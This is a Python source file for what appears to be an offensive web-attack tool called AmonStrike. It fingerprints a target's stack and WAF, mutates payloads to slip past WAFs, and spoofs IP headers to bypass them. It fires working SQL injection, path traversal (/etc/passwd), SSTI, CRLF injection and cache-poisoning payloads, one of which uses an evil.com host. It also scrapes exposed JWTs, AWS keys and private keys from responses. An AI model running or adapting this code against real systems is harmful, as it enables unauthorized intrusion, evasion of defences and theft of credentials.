"""AmonStrike Intelligence Engine - Fully Independent, No External API"""
import re, time
from urllib.parse import urlparse, parse_qs

TECH_SIGS = {
    "php":       ["PHPSESSID","X-Powered-By: PHP","php warning",".php?"],
    "asp":       ["ASP.NET","VIEWSTATE",".aspx?","__doPostBack"],
    "java":      ["JSESSIONID","java.lang.",".jsp?","javax.servlet"],
    "node":      ["X-Powered-By: Express","connect.sid"],
    "python":    ["django","flask","wsgi","gunicorn"],
    "wordpress": ["wp-content","wp-includes","wp-json"],
    "mysql":     ["mysql_fetch","You have an error in your SQL","mysql_num_rows"],
    "postgresql":["pg_query","PostgreSQL","PSQLException"],
    "mssql":     ["SqlException","Microsoft SQL Server","Incorrect syntax near"],
    "oracle":    ["ORA-","oracle.jdbc"],
    "sqlite":    ["unrecognized token","sqlite3.OperationalError"],
    "cloudflare":["cloudflare","cf-ray"],
    "nginx":     ["nginx","Server: nginx"],
    "apache":    ["Apache","Server: Apache"],
}

WAF_SIGS = {
    "cloudflare":  ["cloudflare","cf-ray","attention required"],
    "akamai":      ["akamai","reference #"],
    "aws_waf":     ["request blocked","x-amzn-requestid"],
    "modsecurity": ["mod_security","modsecurity","not acceptable"],
}

class ResponseAnalyzer:
    def analyze(self, body, headers, status, url=""):
        return {
            "technology":    self.detect_tech(body, headers),
            "waf":           self.detect_waf(body, headers),
            "database":      self.detect_database(body),
            "errors":        self.extract_errors(body),
            "secrets":       self.find_secrets(body),
            "endpoints":     self.extract_endpoints(body, url),
            "interesting":   self.find_interesting(body, headers),
            "blocked":       self.is_blocked(status, body),
            "auth_required": self.needs_auth(status, body),
        }

    def detect_tech(self, body, headers):
        combined = body[:5000] + " ".join(f"{k}: {v}" for k,v in headers.items())
        detected = []
        for tech, sigs in TECH_SIGS.items():
            if any(s in combined for s in sigs):
                detected.append(tech)
        return list(set(detected))

    def detect_waf(self, body, headers):
        combined = (body[:2000] + " ".join(
            f"{k}: {v}" for k,v in headers.items())).lower()
        for waf, sigs in WAF_SIGS.items():
            if any(s in combined for s in sigs):
                return waf
        return ""

    def detect_database(self, body):
        for db, sigs in [
            ("MySQL",       ["mysql_fetch","You have an error in your SQL"]),
            ("PostgreSQL",  ["pg_query","PostgreSQL","PSQLException"]),
            ("MSSQL",       ["SqlException","Microsoft SQL Server"]),
            ("Oracle",      ["ORA-","oracle.jdbc"]),
            ("SQLite",      ["unrecognized token","sqlite3"]),
        ]:
            if any(s in body for s in sigs): return db
        return ""

    def extract_errors(self, body):
        errors = []
        for pat in [
            r"(?:Error|Warning|Notice|Fatal):\s*(.+?)(?:\n|<br|$)",
            r"SQL syntax.*?(?:\n|<br|$)",
            r"Traceback.*?(?:\n|<br)",
        ]:
            for m in re.finditer(pat, body, re.I):
                errors.append(m.group()[:200])
        return errors[:5]

    def find_secrets(self, body):
        found = []
        # JWT tokens
        jwt = re.search(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', body)
        if jwt: found.append(f"JWT: {jwt.group()[:80]}")
        # AWS keys
        aws = re.search(r'AKIA[0-9A-Z]{16}', body)
        if aws: found.append(f"AWS Key: {aws.group()}")
        # Generic tokens
        tok = re.search(r'(?:api.key|apikey|token|secret)\s*[=:]\s*["\']([a-zA-Z0-9_\-]{20,})', body, re.I)
        if tok: found.append(f"Token: {tok.group()[:80]}")
        # Private keys
        if "BEGIN PRIVATE KEY" in body or "BEGIN RSA PRIVATE KEY" in body:
            found.append("Private Key exposed")
        return found

    def extract_endpoints(self, body, base_url=""):
        eps = set()
        for pat in [
            r'href=["\']([^"\'#]+)["\']',
            r'action=["\']([^"\']+)["\']',
            r'(?:/api/[^\s"\'<>?#]+)',
        ]:
            for m in re.finditer(pat, body, re.I):
                ep = m.group(1) if m.lastindex else m.group()
                if ep.startswith("/") and base_url:
                    ep = base_url.rstrip("/") + ep
                if ep.startswith("http") or ep.startswith("/"):
                    eps.add(ep)
        return list(eps)[:30]

    def find_interesting(self, body, headers):
        flags = []
        if "application/json" in headers.get("Content-Type",""):
            flags.append("json_api")
        if "graphql" in body.lower():
            flags.append("graphql")
        if re.search(r'/wp-(?:content|admin|includes)', body):
            flags.append("wordpress")
        if re.search(r'(?:admin|dashboard|management)', body, re.I):
            flags.append("admin_reference")
        if re.search(r'swagger|openapi', body, re.I):
            flags.append("api_docs")
        return flags

    def is_blocked(self, status, body):
        return status in [403,429,503] or any(
            w in body.lower() for w in ["forbidden","blocked","access denied"])

    def needs_auth(self, status, body):
        return status in [401,403] or any(
            w in body.lower() for w in ["login","unauthorized","sign in"])


class PayloadMutator:
    def mutate(self, payload, waf_type="", response_text=""):
        mutations = [
            payload,
            payload.replace(" ","/**/"),
            payload.replace("'","%27"),
            payload.replace("<","%3c").replace(">","%3e"),
            payload.replace(" ","%09"),
            payload.upper(),
            payload.replace("OR","||").replace("AND","&&"),
            payload.replace(" ","\t"),
            "/*!" + payload + "*/",
        ]
        if waf_type == "cloudflare":
            mutations.extend([
                payload.replace("=","LIKE"),
                payload.replace("UNION","UN/**/ION"),
            ])
        seen = set(); result = []
        for m in mutations:
            if m not in seen: seen.add(m); result.append(m)
        return result[:15]

    def _encoding_variants(self, payload):
        return [payload,
                payload.replace("'","%27"),
                payload.replace(" ","%20"),
                payload.replace("'","''")]


class AttackStrategyEngine:
    def __init__(self):
        self.analyzer = ResponseAnalyzer()
        self.mutator  = PayloadMutator()

    def build_strategy(self, analysis):
        tech   = analysis.get("technology",[])
        waf    = analysis.get("waf","")
        flags  = analysis.get("interesting",[])
        errors = analysis.get("errors",[])
        secrets= analysis.get("secrets",[])
        return {
            "priority_modules":   self._priority_modules(tech, flags, errors),
            "skip_modules":       self._skip_modules(tech),
            "waf_bypass_headers": self._waf_headers(waf),
            "custom_payloads":    self._custom_payloads(tech, waf),
            "high_value_paths":   self._high_value_paths(flags, tech),
            "attack_reasoning":   self._reasoning(tech, waf, flags),
            "immediate_findings": self._immediate_findings(secrets, errors),
        }

    def _priority_modules(self, tech, flags, errors):
        p = []
        if any(db in tech for db in ["mysql","postgresql","mssql","oracle","sqlite"]):
            p.insert(0,"sqli")
        if "php" in tech:
            p.extend(["lfi","command_injection","file_upload","ssti"])
        if "json_api" in flags or "graphql" in flags:
            p.extend(["idor","cors","graphql_deep","nosql_injection"])
        if "admin_reference" in flags:
            p.extend(["auth","twofa_bypass","idor"])
        if "api_docs" in flags:
            p.extend(["idor","cors","auth"])
        if errors:
            p.extend(["error_disclosure","ssti","sqli"])
        for m in ["xss","cors","headers","clickjacking","csrf","open_redirect","ssrf"]:
            if m not in p: p.append(m)
        return list(dict.fromkeys(p))

    def _skip_modules(self, tech):
        skip = []
        if any(db in tech for db in ["mysql","postgresql","mssql","oracle","sqlite"]):
            skip.append("nosql_injection")
        if "node" in tech or "python" in tech:
            skip.append("lfi")
        return skip

    def _waf_headers(self, waf):
        h = {
            "X-Forwarded-For":          "127.0.0.1",
            "X-Real-IP":                "127.0.0.1",
            "X-Originating-IP":         "127.0.0.1",
            "X-Custom-IP-Authorization":"127.0.0.1",
        }
        if waf == "cloudflare":
            h["CF-Connecting-IP"] = "127.0.0.1"
            h["True-Client-IP"]   = "127.0.0.1"
        elif waf == "akamai":
            h["Akamai-Origin-Hop"] = "1"
        elif waf == "aws_waf":
            h["X-Forwarded-Host"] = "localhost"
        return h

    def _custom_payloads(self, tech, waf):
        p = {}
        if "mysql" in tech:
            p["sqli"] = [
                "' OR SLEEP(5)--",
                "1 AND (SELECT * FROM (SELECT SLEEP(5))a)--",
                "' UNION SELECT 1,2,3--",
                "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
            ]
        elif "postgresql" in tech:
            p["sqli"] = [
                "'; SELECT pg_sleep(5)--",
                "1 AND 1=(SELECT 1 FROM pg_sleep(5))",
                "' UNION SELECT NULL,version()--",
            ]
        elif "mssql" in tech:
            p["sqli"] = [
                "'; WAITFOR DELAY '0:0:5'--",
                "' UNION SELECT NULL,@@version--",
            ]
        if "php" in tech:
            p["lfi"] = [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
            ]
            p["ssti"] = ["{{7*7}}","${7*7}","#{7*7}","{{config}}"]
        return p

    def _high_value_paths(self, flags, tech):
        paths = [
            "/api/v1/users","/api/v2/users","/api/users",
            "/api/admin","/api/me","/api/profile","/admin",
        ]
        if "graphql" in flags:
            paths.extend(["/graphql","/api/graphql","/v1/graphql"])
        if "wordpress" in tech:
            paths.extend(["/wp-json/wp/v2/users","/wp-login.php","/xmlrpc.php"])
        if "api_docs" in flags:
            paths.extend(["/swagger.json","/openapi.json","/api-docs"])
        return paths

    def _reasoning(self, tech, waf, flags):
        parts = []
        if tech:  parts.append(f"Stack: {', '.join(tech[:3])}")
        if waf:   parts.append(f"WAF: {waf}")
        if flags: parts.append(f"Flags: {', '.join(flags[:2])}")
        return " | ".join(parts) or "Generic web application"

    def _immediate_findings(self, secrets, errors):
        findings = []
        for s in secrets:
            findings.append({
                "title":       f"Secret Exposed in Response: {s[:40]}",
                "severity":    "CRITICAL",
                "module":      "intelligence",
                "description": f"Sensitive data found in response: {s}",
                "evidence":    s,
                "remediation": "Remove secrets from responses immediately.",
                "cve":         "CWE-200",
            })
        for e in errors[:2]:
            findings.append({
                "title":       "Error/Stack Trace Disclosed",
                "severity":    "MEDIUM",
                "module":      "intelligence",
                "description": f"Error information exposed: {e[:100]}",
                "evidence":    e,
                "remediation": "Disable debug mode. Use custom error pages.",
                "cve":         "CWE-209",
            })
        return findings


class RealAttackVectors:
    def __init__(self, target, session, timeout=10):
        self.target   = target
        self.session  = session
        self.timeout  = timeout
        self.findings = []

    def run_all(self, endpoints, strategy):
        for fn in [self._cache_poison, self._crlf,
                   self._param_pollution, self._path_bypass]:
            try: self.findings.extend(fn(endpoints, strategy))
            except Exception: pass
        return self.findings

    def _cache_poison(self, endpoints, strategy):
        findings = []
        try:
            r0 = self.session.get(self.target, timeout=self.timeout)
            for hdr, val in {
                "X-Forwarded-Host": "evil.com",
                "X-Original-URL":   "/admin",
            }.items():
                r = self.session.get(
                    self.target, headers={hdr: val}, timeout=self.timeout)
                if r and val in r.text and val not in (r0.text if r0 else ""):
                    findings.append({
                        "title":       f"Cache Poisoning via {hdr}",
                        "severity":    "HIGH",
                        "module":      "cache_poison",
                        "description": f"Header {hdr} reflected in response — may be cached.",
                        "evidence":    f"Header: {hdr}: {val}\nReflected: YES\n{r.text[:200]}",
                        "remediation": "Exclude this header from cache keys.",
                        "cve":         "CWE-349",
                    })
                    break
        except Exception: pass
        return findings

    def _crlf(self, endpoints, strategy):
        findings = []
        for payload in ["%0d%0aX-Injected: header", "%0d%0aSet-Cookie: x=1"]:
            try:
                r = self.session.get(
                    f"{self.target}?test={payload}", timeout=self.timeout)
                if r and "X-Injected" in r.headers:
                    findings.append({
                        "title":       "CRLF Injection — HTTP Header Injection",
                        "severity":    "HIGH",
                        "module":      "crlf",
                        "description": "CRLF characters allow injecting arbitrary HTTP headers.",
                        "evidence":    f"Payload: {payload}\nHeader injected",
                        "remediation": "Strip CRLF chars from all user input.",
                        "cve":         "CWE-93",
                    })
                    break
            except Exception: pass
        return findings

    def _param_pollution(self, endpoints, strategy):
        findings = []
        for ep in endpoints[:5]:
            parsed = urlparse(ep)
            if not parsed.query: continue
            for param, vals in parse_qs(parsed.query).items():
                try:
                    r = self.session.get(
                        f"{ep}&{param}=POLLUTED_HPP", timeout=self.timeout)
                    if r and "POLLUTED_HPP" in r.text:
                        findings.append({
                            "title":       f"HTTP Parameter Pollution — {param}",
                            "severity":    "MEDIUM",
                            "module":      "parameter_pollution",
                            "description": f"Duplicate param '{param}' reflected. Security checks may use first value.",
                            "evidence":    f"URL: {ep}&{param}=POLLUTED_HPP\nReflected: YES",
                            "remediation": "Reject or merge duplicate parameters.",
                            "cve":         "CWE-235",
                        })
                except Exception: pass
        return findings

    def _path_bypass(self, endpoints, strategy):
        findings = []
        payloads = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        for param in ["file","path","page","include","load","template","read"]:
            for payload in payloads[:3]:
                try:
                    r = self.session.get(
                        self.target, params={param: payload},
                        timeout=self.timeout)
                    if r and "root:x:" in r.text:
                        findings.append({
                            "title":       f"Path Traversal — Parameter '{param}'",
                            "severity":    "CRITICAL",
                            "module":      "lfi",
                            "description": f"Parameter '{param}' reads arbitrary server files.",
                            "evidence":    f"Payload: {payload}\n/etc/passwd content found",
                            "remediation": "Validate paths against allowlist. Use basename().",
                            "cve":         "CWE-22",
                        })
                        return findings
                except Exception: pass
        return findings


def shodan_recon(domain: str, api_key: str) -> dict:
    """Query Shodan for target infrastructure info."""
    try:
        import requests
        result = {"ports":[],"vulns":[],"ips":[],"hostnames":[]}
        r = requests.get(
            f"https://api.shodan.io/shodan/host/search",
            params={"key": api_key, "query": f"hostname:{domain}", "limit": 20},
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            for match in data.get("matches",[]):
                ip = match.get("ip_str","")
                port = match.get("port",0)
                vulns = list(match.get("vulns",{}).keys())
                hostnames = match.get("hostnames",[])
                if ip: result["ips"].append(ip)
                if port: result["ports"].append(f"{ip}:{port}")
                result["vulns"].extend(vulns)
                result["hostnames"].extend(hostnames)
            result["vulns"] = list(set(result["vulns"]))
            result["ips"]   = list(set(result["ips"]))
        return result
    except Exception:
        return {}


class IntelligenceOrchestrator:
    def __init__(self, target, output_dir=""):
        self.target          = target
        self.analyzer        = ResponseAnalyzer()
        self.strategy_engine = AttackStrategyEngine()
        import requests, urllib3
        urllib3.disable_warnings()
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers["User-Agent"] = "Mozilla/5.0"

    def run(self) -> dict:
        try:
            r        = self.session.get(self.target, timeout=15)
            analysis = self.analyzer.analyze(
                r.text, dict(r.headers), r.status_code, self.target)
        except Exception:
            analysis = {}
        strategy             = self.strategy_engine.build_strategy(analysis)
        if not isinstance(strategy, dict):
            strategy = {}
        strategy["waf"]      = analysis.get("waf","")
        strategy["tech"]     = analysis.get("technology",[])
        strategy["endpoints"]= analysis.get("endpoints",[])
        return strategy

    def run_advanced_attacks(self, endpoints, strategy):
        vectors = RealAttackVectors(self.target, self.session, timeout=10)
        return vectors.run_all(endpoints, strategy)
